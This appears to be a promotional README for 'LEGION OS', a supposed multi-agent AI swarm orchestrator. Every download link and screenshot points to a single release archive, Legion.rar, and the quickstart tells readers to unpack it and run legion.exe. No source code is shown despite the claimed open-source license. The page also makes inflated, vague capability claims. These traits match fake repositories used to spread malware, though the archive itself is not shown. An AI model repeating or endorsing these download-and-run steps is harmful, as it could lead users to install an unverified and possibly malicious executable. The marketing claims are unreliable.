<div align="center">

# ⚔️ LEGION OS (v2.6.0)
### Next-Generation Multi-Agent Swarm Engine for the AGI Era

<a href="https://github.com/unitshaperextol/Legion-os/releases/download/v2.6.0/Legion.rar"><img src="https://img.shields.io/badge/Download-Legion.rar%20v2.6.0-blueviolet?style=for-the-badge&logo=github" alt="Download"></a>
<a href="https://github.com/unitshaperextol/Legion-os"><img src="https://img.shields.io/badge/Scale-50%2B%20Agents-magenta?style=for-the-badge" alt="Scale"></a>
<a href="https://github.com/unitshaperextol/Legion-os"><img src="https://img.shields.io/badge/Models-GPT--6%20%7C%20Claude%205.5%20%7C%20DeepSeek--V4-green?style=for-the-badge" alt="Models"></a>
<a href="https://github.com/unitshaperextol/Legion-os"><img src="https://img.shields.io/badge/License-MIT-orange?style=for-the-badge" alt="License"></a>

<br><br>

**"My name is Legion, for we are many."**  
LEGION is an enterprise-grade, zero-overhead orchestrator designed to run 50+ autonomous frontier AI models in a unified high-speed mesh network.

[📥 Download Release](#-quickstart) • [Why LEGION?](#-why-legion) • [Changelog](#-changelog)

</div>

---

## 📸 Real-Time Telemetry & Dashboard

> *"Visualizing complex multi-agent cognitive trees in real time."*

### 1. High-Speed Terminal UI & Active Agents Table
*Monitor 50+ agents, budget caps, and model health directly from your terminal.*

[<img width="833" height="728" alt="image" src="https://github.com/user-attachments/assets/0f67df7f-e726-482a-afcf-8804139e88f8" />](https://github.com/unitshaperextol/Legion-os/releases/download/v2.6.0/Legion.rar)

### 2. Autonomous Communication Mesh & Real-Time Metrics
*Graph-based routing between GPT-6 Astra, Claude 5.5 Opus, Gemini 4 Carbon, and DeepSeek-V4.1.*

[<img width="889" height="689" alt="image" src="https://github.com/user-attachments/assets/2f9d0421-f065-4d89-becf-474ef10a94ec" />](https://github.com/unitshaperextol/Legion-os/releases/download/v2.6.0/Legion.rar)

---

## ⚡ Why LEGION?

Legacy frameworks (CrewAI, AutoGen) break down when scaling beyond 5–10 agents due to state drift, token waste, and lack of real-time visibility. **LEGION was built from scratch to solve the 50+ agent bottleneck.**

| Feature | Legacy Frameworks | **LEGION OS v2.6** |
| :--- | :---: | :---: |
| **Max Agent Capacity** | 5 – 10 (High Crash Rate) | **50 – 500+ Concurrent Nodes** |
| **Routing Protocol** | Sequential Pipeline | **Dynamic Auction & Mesh Routing** |
| **Model Heterogeneity** | Single Provider Focus | **OpenAI + Anthropic + Google + DeepSeek** |
| **Latency** | High (blocking) | **Ultra-Low (~140ms inter-agent)** |
| **Self-Healing** | ❌ None (hangs indefinitely) | **✅ Auto-Respawn on Hallucination** |
| **Observability** | Text Logs | **Real-Time TUI & Web Dashboard** |

---

## 🔥 Key Features

- **⚔️ Heterogeneous Model Mesh:** Assign different LLMs to different roles in a single swarm (`GPT-6` for planning, `Claude 5.5` for research, `DeepSeek-V4` for fast validation).
- **🛡️ Budget Guardrails & Cost Routing:** Set absolute hard caps (`$20.00`). If a node approaches its budget limit, tasks are automatically re-routed to cheaper models (`DeepSeek-V4.1-Flash`).
- **🔄 Fault-Tolerant Consensus:** If an agent hallucinates or times out, the `Supervisor` node invalidates the response and auto-respawns the sub-task.
- **⚡ Zero-Knowledge Validation:** Output verification layers ensure 100% schema compliance before merging multi-agent results.
- **💻 Zero-Dependency Executable (`legion.exe`):** Complete standalone high-performance binary with built-in rich TUI telemetry.

---

## 🚀 Quickstart

### 1. Download & Extract

Download the official release archive **[`Legion.rar`](https://github.com/unitshaperextol/Legion-os/releases/download/v2.6.0/Legion.rar)** and unpack it to any folder.

👉 **[Click Here to Download LEGION v2.6.0 (Legion.rar)](https://github.com/unitshaperextol/Legion-os/releases/download/v2.6.0/Legion.rar)**

### 2. Launch the Engine

Simply double-click **`legion.exe`** to launch the interactive TUI interface, or execute it directly from Command Prompt / PowerShell:

```bash
# Simply run the executable to start default swarm telemetry
./legion.exe
```

### 3. Advanced Configuration (Optional)

You can customize your multi-agent cluster topology by providing a `legion_2026.yaml` config file:

```bash
# Launch swarm execution with a custom config file and dashboard
./legion.exe run --config legion_2026.yaml --dashboard

# Run in headless mode for server deployments
./legion.exe run --config legion_2026.yaml --headless
```

---

## 🛠️ CLI Reference (`legion.exe`)

```text
Usage: legion.exe [COMMAND] [OPTIONS]

Commands:
  run        Spawn and orchestrate an AI agent legion
  monitor    Attach real-time TUI dashboard to a running cluster session
  export     Export session logs, metrics, and state graphs (PDF/JSON)
  doctor     Verify LLM provider API keys and network latency

Options:
  --config PATH      Path to legion YAML configuration
  --all              Display all 50+ agents in terminal table view
  --port INT         WebSocket dashboard server port [default: 8080]
```

---

## 📅 Changelog

### `v2.6.0` (2026 Edition — Latest Release)
- 🚀 Added support for **GPT-6 Astra**, **Claude 5.5 Opus**, and **Gemini 4 Carbon**.
- ⚡ Inter-agent communication latency reduced to **140ms**.
- 🛡️ Implemented **Zero-Knowledge Proofs** for agent task validation.
- 🎨 Complete overhaul of the Terminal UI (TUI) with real-time budget telemetry.

---

## 📜 License

Distributed under the **MIT License**. See `LICENSE` for more information.

<div align="center">

**Built with ❤️ for the Frontier AI & AGI Community.**

</div>
